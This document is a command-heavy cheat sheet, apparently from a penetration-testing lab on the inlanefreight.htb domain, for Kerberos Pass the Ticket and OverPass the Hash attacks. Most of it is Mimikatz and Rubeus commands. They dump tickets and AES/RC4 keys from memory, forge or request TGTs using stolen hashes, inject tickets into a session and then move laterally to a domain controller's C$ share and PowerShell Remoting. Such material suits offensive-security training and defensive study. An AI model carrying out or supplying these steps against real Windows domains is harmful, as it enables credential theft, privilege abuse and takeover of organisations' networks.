In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash.
# Kerberos Protocol Refresher
- The Kerberos authentication system is ticket-based.
- The `TGT - Ticket Granting Ticket` is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or `TGS`.
- The `TGS - Ticket Granting Service` is requested by users who want to use a service. These tickets allow services to verify the user's identity.
# Pass the Ticket (PtT) Attack
We need a valid Kerberos ticket to perform a `Pass the Ticket (PtT)`. It can be:
- Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.
- Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.
## Harvesting Kerberos Tickets from Windows
#### Mimikatz - Export Tickets
```cmd
mimikatz.exe
```
```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```
```cmd
dir *.kirbi
```
#### Rubeus - Export Tickets
```cmd
Rubeus.exe dump /nowrap
```
**Note:** To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.
## Pass the Key or OverPass the Hash
#### Mimikatz - Extract Kerberos Keys
```cmd
mimikatz.exe
```
```cmd
privilege::debug
sekurlsa::ekeys
```

Now that we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform the OverPass the Hash or Pass the Key attack using `Mimikatz` and `Rubeus`.
#### Mimikatz - Pass the Key or OverPass the Hash
```cmd
mimikatz.exe
```
```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```
#### Rubeus - Pass the Key or OverPass the Hash
```cmd
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```
## Pass the Ticket (PtT)
With `Rubeus`, we could use the flag `/ptt` to submit the ticket (TGT or TGS) to the current logon session.
### Rubeus Pass the Ticket
```cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```
#### Rubeus - Pass the Ticket
```cmd
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

dir \\DC01.inlanefreight.htb\c$

\\dc01.inlanefreight.htb\c$
```
#### Convert .kirbi to Base64 Format
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```
#### Pass the Ticket - Base64 Format
```cmd
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
```
### Mimikatz - Pass the Ticket
```cmd
mimikatz.exe 
```
```cmd
mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
mimikatz # exit
```

```cmd
dir \\DC01.inlanefreight.htb\c$

\\dc01.inlanefreight.htb\c$
```
## Pass The Ticket with PowerShell Remoting (Windows)
- [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to run scripts or commands on a remote computer. 
- Administrators often use PowerShell Remoting to manage remote computers on the network. 
- Enabling PowerShell Remoting creates both HTTP and HTTPS listeners. 
- The listener runs on standard port TCP/5985 for HTTP and TCP/5986 for HTTPS.
### Mimikatz - PowerShell Remoting with Pass the Ticket
```cmd
mimikatz.exe
```
```cmd
mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
mimikatz # exit
```
```cmd
powershell
```
```powershell
Enter-PSSession -ComputerName DC01
whoami
hostname
```
### Rubeus - PowerShell Remoting with Pass the Ticket
#### Create a Sacrificial Process with Rubeus
```cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
#### Rubeus - Pass the Ticket for Lateral Movement
```cmd
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```
```cmd
powershell
```
```powershell
Enter-PSSession -ComputerName DC01
whoami
hostname
```


